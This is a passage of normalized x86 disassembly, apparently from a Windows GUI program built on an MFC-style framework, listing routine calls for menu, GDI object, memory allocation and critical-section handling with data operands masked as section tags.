retn 0x4
push [ esp + 0x4 ]
add ecx 0x4
call sub_4127ef
sub_4164b0
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
call sub_416486
push eax
call [ DestroyMenu@IAT ]
retn
xor eax eax
retn
sub_4165dd
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
retn 0x4
push eax
call [ DeleteObject@IAT ]
and [ esi ] 0x0
sub_41667e
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn
sub_416692
push esi
mov esi ecx
call sub_416766
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41349d
pop ecx
sub_416720
push 0x1
call sub_4166ae
mov ecx eax
push [ esp + 0x4 ]
call sub_41603a
retn 0x4
sub_41679c
mov eax [ esp + 0x4 ]
mov [ ecx + 0x8 ] eax
retn 0x4
sub_4167a6
mov eax [ esp + 0x4 ]
mov [ ecx + 0x4 ] eax
retn 0x4
sub_4167b0
and [ ecx + 0x8 ] 0x0
retn
sub_4167b5
and [ ecx + 0x4 ] 0x0
retn
sub_416b17
push [ esp + 0x4 ]
push [ ecx + 0x4 ]
call [ GetClipBox@IAT ]
retn 0x4
sub_416b99
push 0x1
call sub_416b27
mov ecx eax
push [ esp + 0x4 ]
call sub_41603a
retn 0x4
sub_416bd8
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
call sub_416bae
push eax
call [ DeleteObject@IAT ]
retn
xor eax eax
retn
sub_416d27
lea eax [ esp + 0xc ]
push 0x1
push eax
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_416bee
retn 0xc
sub_416f80
call sub_4170dd
mov eax [ eax + 0xc4 ]
retn
sub_416f8c
call sub_41730f
xor ecx ecx
cmp [ eax + 0x2c ] ecx
sete cl
mov eax ecx
retn
sub_416f9c
mov eax r--data
retn
sub_417007
push 0x30
call sub_41760b
test eax eax
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
retn
sub_41701c
push esi
mov esi ecx
call sub_417a09
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_417629
sub_417037
mov eax ecx
or [ eax + 0xd4 ] 0xffffffff
or [ eax + 0x104 ] 0xffffffff
mov [ eax ] r--data
retn
sub_41704e
push esi
mov esi ecx
call sub_417069
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_417629
sub_4170dd
push sub_416fa2
mov ecx rw-data
call sub_4178f4
retn
sub_4170ed
call sub_4170f7
jmp sub_4170f8
sub_4170f7
retn
sub_4170f8
push sub_417104
call sub_407381
pop ecx
retn
sub_417104
mov ecx rw-data
jmp r-xdata
jmp sub_41796b
sub_417176
push esi
mov esi ecx
call sub_417191
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_417629
sub_417206
mov eax ecx
and [ eax + 0x8 ] 0x0
and [ eax + 0xc ] 0x0
mov [ eax ] r--data
mov [ eax + 0xc ] 0x54
mov [ eax + 0x28 ] sub_41345a
retn
sub_417225
push esi
mov esi ecx
call sub_417240
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_417629
sub_4172ee
call sub_4172f8
jmp sub_4172f9
sub_4172f8
retn
sub_4172f9
push sub_417305
call sub_407381
pop ecx
retn
sub_417305
mov ecx rw-data
jmp j_sub_4179e4
sub_41730f
push sub_416fa2
mov ecx rw-data
call sub_4178f4
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
retn
push sub_41734c
mov ecx rw-data
call sub_417989
sub_417335
call sub_41730f
add eax 0x1070
push sub_416fd6
mov ecx eax
call sub_4178f4
retn
sub_417374
push esi
mov esi ecx
call j_sub_417191
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_417629
j_sub_417191
jmp sub_417191
sub_417394
mov eax r--data
retn
sub_41739a
call sub_4173a4
jmp sub_4173b6
sub_4173a4
push 0xf023
push 0x0
mov ecx rw-data
call sub_405e98
retn
sub_4173b6
push sub_4173c2
call sub_407381
pop ecx
retn
sub_4173c2
mov ecx rw-data
jmp sub_405ede
sub_4173cc
mov eax r--data
retn
sub_4173d2
call sub_4173dc
jmp sub_4173ee
sub_4173dc
push 0xf021
push 0x0
mov ecx rw-data
call sub_405ee5
retn
sub_4173ee
push sub_4173fa
call sub_407381
pop ecx
retn
sub_4173fa
mov ecx rw-data
jmp sub_405f2b
sub_417516
mov eax r--data
retn
sub_41755c
push esi
mov esi ecx
call j_sub_4145c9
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_405e58
j_sub_4145c9
jmp sub_4145c9
sub_417581
mov eax r--data
retn
sub_417587
call sub_417591
jmp sub_4175a0
sub_417591
push 0x40
push 0x3c
mov ecx rw-data
call sub_405d65
retn
sub_4175a0
push sub_4175ac
call sub_407381
pop ecx
retn
sub_4175ac
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_405d8d
sub_4175f8
mov edx [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
push esi
mov esi [ ecx ]
mov [ edx + eax ] esi
mov [ ecx ] eax
pop esi
retn 0x4
sub_41760b
push esi
push [ esp + 0x8 ]
push 0x40
call [ LocalAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn 0x4
call sub_4125cf
sub_417629
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn 0x4
push [ esp + 0x4 ]
call [ LocalFree@IAT ]
sub_4178d8
push esi
mov esi ecx
call sub_4178f3
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_417629
sub_4178f3
retn
sub_4179d4
push 0x10
call sub_417c63
xor edi edi
push edi
push edi
call sub_408134
sub_417a4a
call sub_417a54
jmp sub_417a55
sub_417a54
retn
sub_417a55
push r-xdata
call sub_407381
pop ecx
retn
sub_417a6b
call sub_417a75
jmp sub_417a76
sub_417a75
retn
sub_417a76
push sub_417a82
call sub_407381
pop ecx
retn
sub_417a82
mov ecx rw-data
jmp j_sub_4179e4
j_sub_4179e4
jmp sub_4179e4
sub_417a91
call sub_417a9b
jmp sub_417aa5
sub_417a9b
mov ecx rw-data
jmp sub_417b0d
sub_417aa5
push sub_417ab1
call sub_407381
pop ecx
retn
sub_417ab1
mov ecx rw-data
jmp sub_417fb0
sub_417aeb
push esi
mov esi [ GetSystemMetrics@IAT ]
push 0x2
call esi
push 0x3
mov [ rw-data ] eax
call esi
and [ rw-data ] 0x0
mov [ rw-data ] eax
pop esi
retn
sub_417ba8
mov eax r--data
retn
sub_417c63
cmp [ rw-data ] 0x0
jne r-xdata
retn 0x4
mov eax [ esp + 0x4 ]
lea eax [ eax + eax * 2 ]
lea eax [ eax * 8 + rw-data ]
push eax
call [ LeaveCriticalSection@IAT ]
sub_417c84
mov eax ecx
mov [ eax ] r--data
retn
sub_417c8d
push esi
mov esi ecx
call sub_417fba
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_417629
sub_417ca8
call sub_417cb2
jmp sub_417cb3
sub_417cb2
retn
sub_417cb3
push sub_417cbf
call sub_407381
pop ecx
retn
sub_417cbf
mov ecx rw-data
jmp j_sub_4179e4
sub_417cec
jmp r-xdata
call sub_417cc9
mov [ rw-data ] eax
retn
sub_417cfc
push 0x8
call sub_413474
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
and [ eax + 0x4 ] 0x0
retn
sub_417d16
mov eax r--data
retn
sub_417d1c
mov ecx rw-data
call sub_405dc9
test eax eax
je r-xdata
xor eax eax
retn
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
retn
sub_417d38
push esi
mov esi ecx
call sub_417d58
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_405e58
sub_417d58
mov eax sub_4182ac
call sub_4072e4
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_4164b0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_417d81
mov eax r--data
retn
sub_417d87
call sub_417d91
jmp sub_417da0
sub_417d91
push 0x40
push 0x8
mov ecx rw-data
call sub_405d65
retn
sub_417da0
push sub_417dac
call sub_407381
pop ecx
retn
sub_417dac
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_405d8d
sub_417dc7
mov eax r--data
retn
sub_417dcd
call sub_417dd7
jmp sub_417de9
sub_417dd7
push 0xf022
push 0x0
mov ecx rw-data
call sub_406243
retn
sub_417de9
push sub_417df5
call sub_407381
pop ecx
retn
sub_417df5
mov ecx rw-data
jmp sub_406289
sub_417dff
mov eax r--data
retn
sub_417e05
call sub_417e0f
jmp sub_417e21
sub_417e0f
push 0xf024
push 0x0
mov ecx rw-data
call sub_406290
retn
sub_417e21
push sub_417e2d
call sub_407381
pop ecx
retn
sub_417e2d
mov ecx rw-data
jmp sub_4062d6
sub_417e37
push 0x10
call sub_413474
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov ecx eax
call sub_41667e
retn
sub_417e4e
mov eax r--data
retn
sub_417e54
push 0x8
call sub_413474
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
and [ eax + 0x4 ] 0x0
retn
sub_417e6e
mov eax r--data
retn
sub_417e9a
push esi
mov esi ecx
call j_sub_416766
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_405e58
j_sub_416766
jmp sub_416766
sub_417ebf
mov eax r--data
retn
sub_417ec5
mov ecx rw-data
call sub_405dc9
test eax eax
je r-xdata
xor eax eax
retn
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
retn
sub_417ee1
push esi
mov esi ecx
call sub_417f01
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_405e58
sub_417f01
mov eax sub_418310
call sub_4072e4
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_416bd8
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_417f2a
mov eax r--data
retn
sub_417f30
call sub_417f3a
jmp sub_417f49
sub_417f3a
push 0x40
push 0x10
mov ecx rw-data
call sub_405d65
retn
sub_417f49
push sub_417f55
call sub_407381
pop ecx
retn
sub_417f55
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_405d8d
sub_417f70
call sub_417f7a
jmp sub_417f89
sub_417f7a
push 0x40
push 0x8
mov ecx rw-data
call sub_405d65
retn
sub_417f89
push sub_417f95
call sub_407381
pop ecx
retn
sub_417f95
test [ rw-data ] 0x2
jne r-xdata
retn
or [ rw-data ] 0x2
mov ecx rw-data
jmp sub_405d8d
sub_417fb0
add ecx 0x50
push ecx
call sub_4165dd
retn
sub_417fe7
call sub_413553
test eax eax
je r-xdata
push [ esp + 0x4 ]
call [ PostQuitMessage@IAT ]
retn 0x4
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
push 0x1
push 0x1
call eax
sub_41800c
lea ecx [ ebp + 0x8 ]
jmp sub_412e25
sub_418014
mov eax r--data
jmp sub_406f9c
sub_418020
mov ecx [ ebp - 0x10 ]
jmp sub_405d0c
sub_418028
mov eax r--data
jmp sub_406f9c
sub_418034
lea ecx [ ebp - 0x10 ]
jmp sub_412e25
sub_41803c
lea ecx [ ebp + 0x10 ]
jmp sub_412e25
sub_418044
mov eax r--data
jmp sub_406f9c
sub_418050
push [ ebp - 0x14 ]
call sub_405d58
retn
sub_418059
mov ecx [ ebp - 0x14 ]
jmp sub_405d0c
sub_418061
mov ecx [ ebp - 0x14 ]
add ecx 0x10
jmp sub_412e25
sub_41806c
mov eax r--data
jmp sub_406f9c
sub_418078
mov eax r--data
jmp sub_406f9c
sub_418084
push [ ebp - 0x10 ]
call sub_417629
retn
sub_41808d
mov eax r--data
jmp sub_406f9c
sub_418098
push [ ebp - 0x10 ]
call sub_417629
retn
sub_4180a1
mov eax r--data
jmp sub_406f9c
sub_4180ac
mov ecx [ ebp - 0x10 ]
jmp sub_405d0c
sub_4180b4
mov eax r--data
jmp sub_406f9c
sub_4180c0
mov ecx [ ebp - 0x10 ]
jmp sub_405d0c
sub_4180d6
mov eax r--data
jmp sub_406f9c
sub_4180e0
mov ecx [ ebp - 0x10 ]
jmp sub_405d0c
sub_4180e8
mov eax r--data
jmp sub_406f9c
sub_4180f4
mov eax r--data
jmp sub_406f9c
sub_418100
mov ecx [ ebp - 0x10 ]
jmp sub_405d0c
sub_418108
mov eax r--data
jmp sub_406f9c
sub_418114
mov eax r--data
jmp sub_406f9c
sub_418120
push [ ebp + 0x8 ]
call sub_41349d
pop ecx
retn
sub_41812a
mov eax r--data
jmp sub_406f9c
sub_418134
mov eax r--data
jmp sub_406f9c
sub_418140
mov ecx [ ebp - 0x10 ]
jmp sub_413645
sub_418148
mov eax r--data
jmp sub_406f9c
sub_418154
mov eax r--data
jmp sub_406f9c
sub_418160
lea ecx [ ebp - 0x8 ]
jmp sub_40618d
sub_418168
mov eax r--data
jmp sub_406f9c
sub_418174
lea ecx [ ebp - 0x24 ]
jmp sub_416766
sub_41817c
lea ecx [ ebp - 0x60 ]
jmp sub_4145c9
sub_418184
lea ecx [ ebp - 0x24 ]
jmp sub_416766
sub_41818c
mov eax r--data
jmp sub_406f9c
sub_418198
lea ecx [ ebp - 0x48 ]
jmp sub_4145c9
sub_4181a0
mov eax r--data
jmp sub_406f9c
sub_4181ac
push [ ebp - 0x10 ]
call sub_405d58
retn
sub_4181b5
mov eax r--data
jmp sub_406f9c
sub_4181c0
push [ ebp - 0x10 ]
call sub_415fc6
pop ecx
retn
sub_4181ca
mov eax r--data
jmp sub_406f9c
sub_4181d4
push [ ebp - 0x10 ]
call sub_417629
retn
sub_4181dd
mov eax r--data
jmp sub_406f9c
sub_4181e8
mov eax r--data
jmp sub_406f9c
sub_4181f4
mov ecx [ ebp - 0x10 ]
jmp sub_405d0c
sub_4181fc
mov eax r--data
jmp sub_406f9c
sub_418208
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_41272e
sub_418213
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_41272e
sub_41821e
mov eax r--data
jmp sub_406f9c
sub_418228
mov eax r--data
jmp sub_406f9c
sub_418234
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_41272e
sub_41823f
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_41272e
sub_41824a
mov eax r--data
jmp sub_406f9c
sub_418254
mov ecx [ ebp - 0x10 ]
jmp sub_405d0c
sub_41825c
mov eax r--data
jmp sub_406f9c
sub_418268
lea ecx [ ebp - 0x10 ]
jmp sub_412e25
sub_418270
mov eax r--data
jmp sub_406f9c
sub_41827c
mov ecx [ ebp - 0x10 ]
jmp sub_405d0c
sub_418284
mov eax r--data
jmp sub_406f9c
sub_418290
push [ ebp + 0x8 ]
call sub_41349d
pop ecx
retn
sub_41829a
mov eax r--data
jmp sub_406f9c
sub_4182a4
mov ecx [ ebp - 0x10 ]
jmp sub_405d0c
sub_4182ac
mov eax r--data
jmp sub_406f9c
sub_4182b8
mov ecx [ ebp - 0x10 ]
jmp sub_405d0c
sub_4182c0
mov eax r--data
jmp sub_406f9c
sub_4182cc
push [ ebp + 0x8 ]
call sub_41349d
pop ecx
retn
sub_4182d6
mov eax r--data
jmp sub_406f9c
sub_4182e0
mov ecx [ ebp - 0x10 ]
jmp sub_405d0c
sub_4182e8
mov eax r--data
jmp sub_406f9c
sub_4182f4
push [ ebp + 0x8 ]
call sub_41349d
pop ecx
retn
sub_4182fe
mov eax r--data
jmp sub_406f9c
sub_418308
mov ecx [ ebp - 0x10 ]
jmp sub_405d0c
sub_418310
mov eax r--data
jmp sub_406f9c
sub_41831c
mov ecx [ ebp - 0x10 ]
jmp sub_405d0c
sub_418324
mov eax r--data
jmp sub_406f9c
